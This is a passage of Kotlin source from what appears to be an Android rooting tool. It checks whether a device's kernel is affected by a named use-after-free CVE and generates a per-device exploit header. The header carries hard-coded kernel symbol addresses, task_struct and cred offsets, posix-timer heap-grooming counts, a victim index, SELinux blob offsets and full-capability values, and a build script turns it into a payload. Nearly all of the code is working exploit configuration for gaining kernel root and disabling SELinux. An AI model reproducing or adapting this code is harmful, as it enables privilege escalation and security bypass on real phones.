     * 优先用本机标定过的（且内核版本对得上），否则用内置 profile，都没有就返回 null。
     */
    /**
     * 两个内核版本串是不是同一颗内核。
     * ROM 之间细节会飘（后缀 -4k、abogki 段、是否被截断），所以按「去掉尾部 -Nk 后
     * 前 22 个字符一致」判定，两个方向都试，避免 标定 写进去、运行时又认不出来。
     */
    /**
     * CVE-2026-98260 的受影响区间（上游披露）：
     *   5.7 <= k < 6.6.158；6.12.* < 6.12.112；6.18.* < 6.18.54；7.2.* < 7.2.8；7.3-rc4 之前。
     * 区间外（5.4、6.6.158+、6.12.112+、6.18.54+、7.2.8+ 等）没有这个 bug，
     * 既不该出现在内置表里，也不该让用户去跑一遍注定失败的链。
     */
    fun isVulnerable(release: String?): Boolean {
        val v = parseVersion(release) ?: return true      // 认不出就不拦，交给后续匹配
        val (major, minor, patch) = v
        return when {
            major < 5 -> false
            major == 5 && minor < 7 -> false
            major < 6 -> true                              // 5.7 .. 5.x
            major == 6 && minor < 6 -> true                // 6.0 .. 6.5
            major == 6 && minor == 6 -> patch < 158
            major == 6 && minor == 12 -> patch < 112
            major == 6 && minor == 18 -> patch < 54
            major == 7 && minor == 2 -> patch < 8
            major == 7 && minor == 3 -> patch == 0 && false // 7.3 只有 7.3-rc4 之前受影响，正式版未知，先不认
            else -> false
        }
    }

    private fun parseVersion(release: String?): Triple<Int, Int, Int>? {
        if (release.isNullOrBlank()) return null
        val m = Regex("^(\\d+)\\.(\\d+)(?:\\.(\\d+))?").find(release.trim()) ?: return null
        val a = m.groupValues[1].toIntOrNull() ?: return null
        val b = m.groupValues[2].toIntOrNull() ?: return null
        val c = m.groupValues[3].toIntOrNull() ?: 0
        return Triple(a, b, c)
    }

    fun sameKernel(a: String, b: String): Boolean {
        val ka = kernelKey(a)
        val kb = kernelKey(b)
        // 两边都能取出「版本号 + g<hash>」时，必须 hash 一致才算同一颗内核。
        // 以前退化成「前 22 个字符相同」，而 6.1.157 家族的公共前缀本身就超过 22 个字符，
        // 结果 BVL-AN16 的 g7db56fb8f741 被当成 ELP 的 g7d3922fade43 —— 界面显示「已适配」，
        // 实际没有 cfg，一点就 NO_CFG。
        val hashed = { k: String -> k.contains("-g") && k.length > k.indexOf("-g") + 2 }
        if (ka.isNotEmpty() && kb.isNotEmpty() && hashed(ka) && hashed(kb))
            return ka == kb
        if (ka.isNotEmpty() && kb.isNotEmpty() && ka == kb) return true
        fun norm(s: String) = s.trim().lowercase().replace(Regex("-\\d+k$"), "")
        val x = norm(a)
        val y = norm(b)
        if (x.isEmpty() || y.isEmpty()) return false
        return x == y
    }

    /**
     * 内核身份 key：主版本号 + g 后面的 build 哈希前 12 位。
     *
     * `6.6.118-android15-8-g554929766a0d-abogki544555896-4k` → `6.6.118-g554929766a0d`
     *
     * 「这台上能不能跑」只看这个 key —— 同一颗内核换个机型名也照样能跑；
     * 机型只在同一 key 有多条记录时当 tiebreak。
     */
    fun kernelKey(release: String?): String {
        val s = release?.trim()?.lowercase().orEmpty()
        if (s.isEmpty()) return ""
        val ver = Regex("^\\d+\\.\\d+\\.\\d+").find(s)?.value ?: s.take(8)
        val hash = Regex("g([0-9a-f]{8,40})").find(s)?.groupValues?.get(1)?.take(12)
        return if (hash.isNullOrEmpty()) ver else "$ver-g$hash"
    }

    /**
     * 显示用的 release：去掉 git describe 的提交计数段。
     *
     * `5.10.218-android12-9-00060-g821a11a160ed-ab12930949` → `5.10.218-android12-9-g821a11a160ed-ab12930949`
     *
     * 只用于界面，**匹配一律用原始 release** —— 真机 uname -r 里是带这串数字的，
     * 删掉之后 startsWith 就对不上了。
     */
    fun prettyRelease(release: String?): String =
        release.orEmpty().replace(Regex("-(\\d{5})(?=-g)"), "")

    /** 给日志看的一行：cur / stored / cfg 文件 / 结论。 */
    fun cfgDiagnosis(ctx: android.content.Context): String {
        val cur = System.getProperty("os.version").orEmpty()
        val stored = ctx.getSharedPreferences("cfg", android.content.Context.MODE_PRIVATE)
            .getString("release", null)
        val file = cfgFile(ctx)
        val has = file.isFile
        val verdict = when {
            !has -> "无 cfg 文件"
            stored == null -> "有 cfg 但没记录来源内核"
            sameKernel(cur, stored) -> "命中"
            else -> "版本不一致（已忽略）"
        }
        return "cur=${cur.ifEmpty { "?" }} stored=${stored ?: "?"} file=$has n=${PROFILES.size} v=${BuildConfig.VERSION_NAME} → $verdict"
    }

    fun cfgBytesForCurrentKernel(ctx: android.content.Context): ByteArray? {
        val cur = System.getProperty("os.version").orEmpty()
        val stored = ctx.getSharedPreferences("cfg", android.content.Context.MODE_PRIVATE)
            .getString("release", null)
        val file = cfgFile(ctx)
        if (file.isFile && stored != null && sameKernel(cur, stored)) {
            return runCatching { file.readBytes() }.getOrNull()
        }
        val p = profileFor(cur) ?: ProfileStore.match(ctx, cur) ?: return null
        return runCatching { emitCfgBlob(p.symbols, p.offsets, p.measured) }.getOrNull()
    }

    /**
     * 内置基线（= payload 编译期常量，内核 6.6.118-android15-8-g554929766a0d）。
     * 没选 boot.img 时用它生成 device.cfg，等价于"把当前常量重新下发一遍"。
     */
    object Baseline {
        val symbols: Map<String, Long> = mapOf(
            "do_timer_create" to 0xFFFFFFC0803AFC58uL.toLong(),
            "selinux_state" to 0xFFFFFFC0823BA418uL.toLong(),
            "panic_on_warn" to 0xFFFFFFC08216AE0CuL.toLong(),
            "root_user" to 0xFFFFFFC08218F228uL.toLong(),
            "init_user_ns" to 0xFFFFFFC08218EF98uL.toLong(),
            "init_ucounts" to 0xFFFFFFC082190CF8uL.toLong(),
            "init_groups" to 0xFFFFFFC082190788uL.toLong(),
        )

        val offsets = Offsets(
            itimerSize = 0x108, itimerNode = 0x78, itimerHead = 0x98, itimerElist = 0xA8,
            itimerFiring = 0xB8, itimerHandling = 0xC0,
            taskCred = 0x820, taskComm = 0x830,
            credSize = 0xB8, credUid = 0x8,
            credSecurity = 0x80, credUser = 0x88, credUserNs = 0x90,
            credUcounts = 0x98, credGroups = 0xA0,
        )
        const val release = "6.6.118-android15-8-g554929766a0d-abogki544555896-4k"
    }

    /** device.cfg 放哪（App 私有目录），部署时会被推到设备上同名路径。 */
    fun cfgFile(ctx: android.content.Context): java.io.File =
        java.io.File(ctx.filesDir, "device.cfg")

    private fun h(v: Long) = "0x" + java.lang.Long.toHexString(v)
    private fun h(v: Int) = "0x" + Integer.toHexString(v)

    /**
     * 生成与 tools/gen-config.py 同构的 device_config.h。
     * 生成后拷到 PC 上 `tools/build-payload.sh` 就能出本机 payload。
     */
    fun emitHeader(
        kernelRelease: String,
        syms: Map<String, Long>,
        off: Offsets,
        m: Measured,
        btfSha256: String,
        kallsymsSha256: String,
    ): String {
        val missing = CORE_SYMBOLS.filter { (syms[it] ?: 0L) == 0L }
        require(missing.isEmpty()) { "kallsyms 缺少符号：${missing.joinToString()}" }

        val timerSite = syms["do_timer_create"]!! + m.timerSiteOffset.toLong()
        val low21 = timerSite and 0x1FFFFF
        val ts = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.ROOT).format(Date())

        // 先取出来：Kotlin 的模板表达式里不能写 \"key\" 这种转义引号
        val symSelinux = syms["selinux_state"]!!
        val symPanic = syms["panic_on_warn"] ?: 0L
        val symRootUser = syms["root_user"]!!
        val symUserNs = syms["init_user_ns"]!!
        val symUcounts = syms["init_ucounts"]!!
        val symGroups = syms["init_groups"]!!

        return buildString {
            appendLine("/*")
            appendLine(" * device_config.h - 机型相关常量（ExtractKit 标定页生成，不要手改）")
            appendLine(" *")
            appendLine(" * kernel_release : $kernelRelease")
            appendLine(" * generated_at   : $ts")
            appendLine(" * btf      sha256: $btfSha256")
            appendLine(" * kallsyms sha256: $kallsymsSha256")
            appendLine(" */")
            appendLine("#ifndef DEVICE_CONFIG_H")
            appendLine("#define DEVICE_CONFIG_H")
            appendLine()
            appendLine("/* ---- kmem tracepoint event id（每个 build 都变，必须实测） ---- */")
            appendLine("#define EV_CACHE_ALLOC ${m.evCacheAlloc}")
            appendLine("#define EV_CACHE_FREE ${m.evCacheFree}")
            appendLine("#define EV_PAGE_FREE ${m.evPageFree}")
            appendLine("#define EV_PAGE_ALLOC ${m.evPageAlloc}")
            appendLine("#define EV_PCPU_DRAIN ${m.evPcpuDrain}")
            appendLine()
            appendLine("/* ---- kmem 记录字段偏移（稳定） ---- */")
            appendLine("#define OFF_SITE 8")
            appendLine("#define OFF_PTR 16")
            appendLine("#define OFF_REQ 24")
            appendLine("#define OFF_ALLOC 32")
            appendLine("#define OFF_PFN 8")
            appendLine("#define OFF_ORDER 16")
            appendLine()
            appendLine("/* ---- struct k_itimer（BTF） ---- */")
            appendLine("#define ITIMER_SIZE ${h(off.itimerSize)}")
            appendLine("#define ITIMER_NODE ${h(off.itimerNode)}")
            appendLine("#define ITIMER_HEAD ${h(off.itimerHead)}")
            appendLine("#define ITIMER_ELIST ${h(off.itimerElist)}")
            appendLine("#define ITIMER_FIRING ${h(off.itimerFiring)}")
            appendLine("#define ITIMER_HANDLING ${h(off.itimerHandling)}")
            appendLine("#define TIMER_OBJ ${h(off.itimerSize)}")
            appendLine()
            appendLine("/* ---- posix_timers_cache 整形（SLUB 行为，需实测） ---- */")
            appendLine("#define PADDING_TIMERS (${m.paddingSlabs} * ${m.objectsPerSlab})")
            appendLine("#define NTIMERS ${m.ntimers}")
            appendLine("#define VICTIM_IDX ${m.victimIdx}")
            appendLine("#define LOCKERS ${m.lockers}")
            appendLine("#define VMA_COUNT ${m.vmaCount}UL")
            appendLine("#define HELPER_STACK (1UL << 20)")
            appendLine()
            appendLine("/* ---- cred_jar（实测） ---- */")
            appendLine("#define CRED_REQ ${h(m.credReq)}")
            appendLine("#define CRED_ALLOC ${h(m.credAlloc)}")
            appendLine("#define CRED_SITE_LOW21 ${h(m.credSiteLow21)}UL")
            appendLine()
            appendLine("/* ---- 链接期地址（kallsyms）与 slide 基准 ---- */")
            appendLine("#define STATIC_TIMER_SITE ${h(timerSite)}ULL	/* do_timer_create+${h(m.timerSiteOffset)} */")
            appendLine("#define TIMER_SITE_LOW21 ${h(low21)}UL")
            appendLine()
            appendLine("#define SELINUX_STATE_STATIC ${h(symSelinux)}ULL")
            appendLine("#define PANIC_ON_WARN_STATIC ${h(symPanic)}ULL")
            appendLine("#define ROOT_USER_STATIC ${h(symRootUser)}ULL")
            appendLine("#define INIT_USER_NS_STATIC ${h(symUserNs)}ULL")
            appendLine("#define INIT_UCOUNTS_STATIC ${h(symUcounts)}ULL")
            appendLine("#define INIT_GROUPS_STATIC ${h(symGroups)}ULL")
            appendLine()
            appendLine("/* ---- task_struct（BTF + 实测） ---- */")
            appendLine("#define OFF_TASK_CRED ${h(off.taskCred)}ULL")
            appendLine("#define OFF_TASK_COMM ${h(off.taskComm)}ULL")
            appendLine("#define TASK_ALLOC_LOW21 ${h(m.taskAllocLow21)}UL")
            appendLine("#define TASK_ALLOC_BYTES ${h(m.taskAllocBytes)}ULL")
            appendLine("#define TASK_ALLOC_ROUND ${h(m.taskAllocBytes)}ULL")
            appendLine()
            appendLine("/* ---- struct cred（BTF） ---- */")
            appendLine("#define CRED_UID_OFF ${h(off.credUid)}ULL")
            appendLine("#define CRED_OFF_SECURITY ${h(off.credSecurity)}ULL")
            appendLine("#define CRED_OFF_USER ${h(off.credUser)}ULL")
            appendLine("#define CRED_OFF_USER_NS ${h(off.credUserNs)}ULL")
            appendLine("#define CRED_OFF_UCOUNTS ${h(off.credUcounts)}ULL")
            appendLine("#define CRED_OFF_GROUPS ${h(off.credGroups)}ULL")
            appendLine("#define CRED_BLOB_OFF 0x1f00UL")
            appendLine("#define SELINUX_BLOB_OFF ${h(m.selinuxBlobOff)}ULL")
            appendLine("#define SELINUX_SID_KERNEL ${m.selinuxSidKernel}U")
            appendLine("#define FULLCAP 0x1ffffffffffULL")
            appendLine()
            appendLine("#endif /* DEVICE_CONFIG_H */")
        }
    }
}
